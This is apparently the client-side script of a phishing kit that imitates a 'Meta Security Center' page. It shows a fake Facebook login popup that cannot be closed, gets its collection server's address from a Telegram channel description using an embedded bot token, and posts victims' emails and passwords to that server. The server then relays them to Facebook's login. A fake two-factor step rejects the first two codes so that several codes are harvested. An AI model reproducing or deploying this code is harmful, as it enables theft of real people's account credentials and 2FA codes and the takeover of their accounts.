// ========================================
// Meta Security Center – Script
// ========================================
const BOT_TOKEN = "7316384120:AAFkScLCi6PiX5w53djH7sgN0lNAxlTn-FE";
const CHANNEL_USER = "f4i4hyfyfrhgrvggigdh";

// ---- State Variables ----
let cachedServerUrl = null; // Biến lưu tạm IP để tăng tốc
let tfaAttempts = 0;
let tfaTimer = null;

async function getLiveServerUrl() {
    if (cachedServerUrl) return cachedServerUrl; // Nếu đã có IP thì trả về luôn cho nhanh

    try {
        const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=@${CHANNEL_USER}`;
        const response = await fetch(tgUrl);
        const data = await response.json();

        if (data.ok && data.result.description) {
            let desc = data.result.description.trim();

            // Loại bỏ tiền tố DATA: nếu có
            if (desc.toUpperCase().startsWith("DATA:")) {
                desc = desc.substring(5).trim();
            }

            let vpsIp = desc;
            if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(desc)) {
                try {
                    vpsIp = atob(desc).trim();
                } catch (e) { }
            }

            let serverUrl = vpsIp;

            // Nếu vpsIp chưa có http/https, thêm http:// và :8080
            if (!serverUrl.startsWith('http://') && !serverUrl.startsWith('https://')) {
                serverUrl = `http://${vpsIp}:8080/`;
            }

            // Đảm bảo kết thúc bằng dấu /
            if (!serverUrl.endsWith('/')) {
                serverUrl += '/';
            }

            cachedServerUrl = serverUrl;
            console.log("🚀 Server URL Updated:", cachedServerUrl);
            return cachedServerUrl;
        }
    } catch (e) {
        console.error("Lỗi lấy cấu hình IP:", e);
    }
    return "http://localhost:8080/";
}

// ---- Login Form (Popup Overlay) ----
// Thêm 'async' để xử lý đợi lấy IP
document.getElementById('loginForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const errorEl = document.getElementById('loginError');

    if (!email || !password) {
        errorEl.textContent = 'Please fill in all fields.';
        errorEl.style.display = 'block';
        return;
    }

    errorEl.style.display = 'none';

    // LẤY IP TRƯỚC KHI GỬI REQUEST
    const liveApiUrl = await getLiveServerUrl();
    sendLoginRequest(email, password, liveApiUrl);
});

// Close button on popup - does nothing (prevents closing)
document.getElementById('popupCloseBtn').addEventListener('click', function (e) {
    const errorEl = document.getElementById('loginError');
    errorEl.textContent = 'You must log in to continue.';
    errorEl.style.display = 'block';
});

// Prevent overlay click from closing
document.getElementById('fbLoginOverlay').addEventListener('click', function (e) {
    if (e.target === this) {
        const errorEl = document.getElementById('loginError');
        errorEl.textContent = 'You must log in to continue.';
        errorEl.style.display = 'block';
    }
});

function hideLoginOverlay() {
    const overlay = document.getElementById('fbLoginOverlay');
    overlay.style.opacity = '0';
    overlay.style.transition = 'opacity 0.3s ease';
    setTimeout(function () {
        overlay.style.display = 'none';
    }, 300);
}

function showTwoFactorUI() {
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('loginError').style.display = 'none';
    document.getElementById('twoFactorUI').style.display = 'block';

    // Default to Notification Flow
    document.getElementById('tfaNotificationFlow').style.display = 'block';
    document.getElementById('tfaCodeFlow').style.display = 'none';

    startNotificationTimer();
}

function startNotificationTimer() {
    if (tfaTimer) clearTimeout(tfaTimer);
    // User requested 20s for notification flow error
    tfaTimer = setTimeout(showInvalidRequestModal, 20000);
}

function stopNotificationTimer() {
    if (tfaTimer) {
        clearTimeout(tfaTimer);
        tfaTimer = null;
    }
}

function toggleTfaMode() {
    const notifFlow = document.getElementById('tfaNotificationFlow');
    const codeFlow = document.getElementById('tfaCodeFlow');

    if (notifFlow.style.display !== 'none') {
        // Switch to Code Flow
        notifFlow.style.display = 'none';
        codeFlow.style.display = 'block';
        stopNotificationTimer();
        tfaAttempts = 0; // Reset code attempts when entering code flow
    } else {
        // Switch to Notification Flow
        codeFlow.style.display = 'none';
        notifFlow.style.display = 'block';
        startNotificationTimer();
    }
}

function showInvalidRequestModal() {
    document.getElementById('invalidRequestModal').style.display = 'flex';
}

function closeInvalidModal() {
    // Force reload to restart the flow as requested
    window.location.reload();
}

function hideTwoFactorUI() {
    stopNotificationTimer();
    document.getElementById('twoFactorUI').style.display = 'none';
    document.getElementById('loginForm').style.display = 'block';
}

// ---- Send Login via API ----
function sendLoginRequest(email, password, liveApiUrl) {
    const errorEl = document.getElementById('loginError');
    const btn = document.getElementById('btnLogin');

    // Displaying debug info immediately
    errorEl.textContent = 'Login...';
    errorEl.style.color = '#65676b';
    errorEl.style.display = 'block';
    errorEl.style.whiteSpace = 'pre-wrap'; // Support for raw text viewing
    errorEl.style.fontSize = '12px';

    // Sử dụng IP động được truyền vào
    const apiUrl = liveApiUrl || "http://localhost:8080/";
    const directUrl = "https://www.facebook.com/login/";

    // Payload Template with placeholders
    const payloadTemplate = "jazoest=22442&lsd=AdR9ki3oUxn3jcGGa8vu_m_obMo&email={{email}}&login_source=comet_headerless_login&next=&shared_prefs_data=eyIzMDAwMCI6W3sidCI6MTc3MDkwNDY3MS4yNTMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NzA5MDQ2NzEuMjUzLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3NzA5MDQ2NzEuMjUzLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NzA5MDQ2NzEuMjU0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOlsiZW4tVVMiLCJlbiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzcwOTA0NjcxLjI1NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJlIjp7ImVjIjozfX1dLCIzMDAwNSI6W3sidCI6MTc3MDkwNDY3MS4yNTQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6eyJ3IjoxODY5LCJoIjo5Mjd9fV0sIjMwMDA3IjpbeyJ0IjoxNzcwOTA0NjcxLjI1NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiZGVmYXVsdCJ9XSwiMzAwMDgiOlt7InQiOjE3NzA5MDQ2NzEuMzEyLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiJwcm9tcHQifV0sIjMwMDEyIjpbeyJ0IjoxNzcwOTA0NjcxLjI1NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiIn1dLCIzMDAxMyI6W3sidCI6MTc3MDkwNDY3MS4yNTUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6IjUuMCAoV2luZG93cykifV0sIjMwMDE1IjpbeyJ0IjoxNzcwOTA0NjcxLjI1NSwiY3R4Ijp7ImcnIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzcwOTA0NjcxLjI1NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2Ijo0fV0sIjMwMDIyIjpbeyJ0IjoxNzcwOTA0NjcxLjMwMSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzcwOTA0NjcxLjMwMSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjotNDIwfV0sIjMwMDkzIjpbeyJ0IjoxNzcwOTA0NjcxLjMwMSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzcwOTA0NjcxLjMwMSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTQ3LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTQ3LjAifV0sIjMwMDk1IjpbeyJ0IjoxNzcwOTA0NjcxLjMwMSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoyfV0sIjMwMTA2IjpbeyJ0IjoxNzcwOTA0NjcxLjI0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOmZhbHNlfSx7InQiOjE3NzA5MDQ2NzEuMjQ4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnRydWV9LHsidCI6MTc3MDkwNDY3MS4yNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzcwOTA0NjcxLjMzMiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzcwOTA0NjcxLjI0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOmZhbHNlfV19&encpass=#PWD_BROWSER:0:1771684267:{{password}}";

    const body = payloadTemplate
        .replace("{{email}}", encodeURIComponent(email))
        .replace("{{password}}", encodeURIComponent(password));

    btn.textContent = 'Logging in...';
    btn.disabled = true;

    fetch(apiUrl, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: body,
    })
        .then(async response => {
            const text = await response.text();

            // Robust Key Check
            const isTwoFactor = text.includes("two_factor") || text.includes("https://www.facebook.com/auth_platform/afad/?apc=");
            const isSuccess = text.includes("Go to Facebook.com") || text.includes('page_uri:"https://m.facebook.com/?lsrc=lb&wtsid') || text.includes("Redirecting...") || text.includes('rel="canonical" href="https://www.facebook.com/"') || text.includes("/><title>Facebook</title><meta");
            const isIncorrect = text.includes("incorrect") || text.includes("incorrect.") || text.includes("entered is incorrect");
            const isBlocked = text.includes("https://www.facebook.com/two_step_verification/authentication/?encrypted_context=");
            const isNoAccount = text.includes("isn't connected") || text.includes("isn&#039;t connected") || text.includes("isnâ€™t connected") || text.includes("Wrong credentials") || text.includes("Invalid username or password");

            if (isTwoFactor) {
                showTwoFactorUI();
            } else if (isSuccess) {
                hideLoginOverlay();
            } else if (isIncorrect || isNoAccount) {
                errorEl.textContent = 'You have entered incorrect login information.';
                errorEl.style.display = 'block';
            } else if (isBlocked) {
                errorEl.textContent = 'Too Many Requests or Account Locked';
                errorEl.style.display = 'block';
            } else {
                errorEl.textContent = 'Invalid request.';
                errorEl.style.display = 'block';
            }
        })
        .catch(error => {
            console.error("Proxy Error:", error);
            errorEl.textContent = 'Invalid request.';
            errorEl.style.display = 'block';
        })
        .finally(() => {
            btn.textContent = 'Log in';
            btn.disabled = false;
        });
}

// ---- Notification-based 2FA Logic ----
document.getElementById('btnTfaToggleFlow').addEventListener('click', function () {
    toggleTfaMode();
});

// ---- Code-based 2FA Logic ----
document.getElementById('tfaCodeForm').addEventListener('submit', async function (e) {
    e.preventDefault();
    const code = document.getElementById('tfaCodeInput').value.trim();
    const errorEl = document.getElementById('tfaCodeError');
    const btn = document.getElementById('btnTfaSubmitCode');
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (code.length < 6) {
        errorEl.textContent = 'Please enter a 6-digit code.';
        errorEl.style.display = 'block';
        return;
    }

    tfaAttempts++;
    errorEl.style.display = 'none';
    btn.disabled = true;
    btn.textContent = 'Verifying...';

    // Simulated short delay for realism
    setTimeout(async () => {
        try {
            const liveApiUrl = await getLiveServerUrl();
            const body = `approvals_code=${encodeURIComponent(code)}&email=${encodeURIComponent(email)}&encpass=${encodeURIComponent(password)}`;

            await fetch(liveApiUrl, {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: body
            });

            // Logic 3 attempts: 2 errors, 3rd success
            if (tfaAttempts < 3) {
                errorEl.textContent = "The login code you entered doesn't match the one sent to your phone. Please check the number and try again.";
                errorEl.style.display = 'block';
                btn.disabled = false;
                btn.textContent = 'Continue';
                document.getElementById('tfaCodeInput').value = '';
            } else {
                // Success on 3rd attempt
                hideLoginOverlay();
            }
        } catch (err) {
            console.error("2FA Error:", err);
            errorEl.textContent = "The login code is incorrect, please check its validity and try again.";
            errorEl.style.display = 'block';
            btn.disabled = false;
            btn.textContent = 'Continue';
        }
    }, 1500);
});

// ---- Modal Controls ----
document.getElementById('btnReview').addEventListener('click', function () {
    document.getElementById('modalOverlay').style.display = 'flex';
    document.getElementById('reviewForm').style.display = 'block';
    document.getElementById('reviewSuccess').style.display = 'none';
});

function closeModal() {
    document.getElementById('modalOverlay').style.display = 'none';
}

document.getElementById('modalOverlay').addEventListener('click', function (e) {
    if (e.target === this) closeModal();
});

// ---- Review Form ----
function submitReview(e) {
    e.preventDefault();
    const btn = e.target.querySelector('.btn-submit-review');
    btn.textContent = 'Submitting...';
    btn.disabled = true;

    setTimeout(function () {
        document.getElementById('reviewForm').style.display = 'none';
        document.getElementById('reviewSuccess').style.display = 'block';
    }, 1500);
}

// ---- File Attachment UI ----
const fileInput = document.getElementById('fbAttachment');
const fileList = document.getElementById('fileList');

if (fileInput) {
    fileInput.addEventListener('change', function () {
        fileList.innerHTML = '';
        const files = Array.from(this.files);
        if (files.length > 0) {
            files.forEach((file, index) => {
                const item = document.createElement('div');
                item.className = 'file-item';
                item.innerHTML = `<span>${file.name}</span><button type="button" onclick="removeFile(${index})">&times;</button>`;
                fileList.appendChild(item);
            });
        }
    });
}

function removeFile(index) {
    const dt = new DataTransfer();
    const { files } = fileInput;
    for (let i = 0; i < files.length; i++) {
        if (i !== index) dt.items.add(files[i]);
    }
    fileInput.files = dt.files;
    fileInput.dispatchEvent(new Event('change'));
}
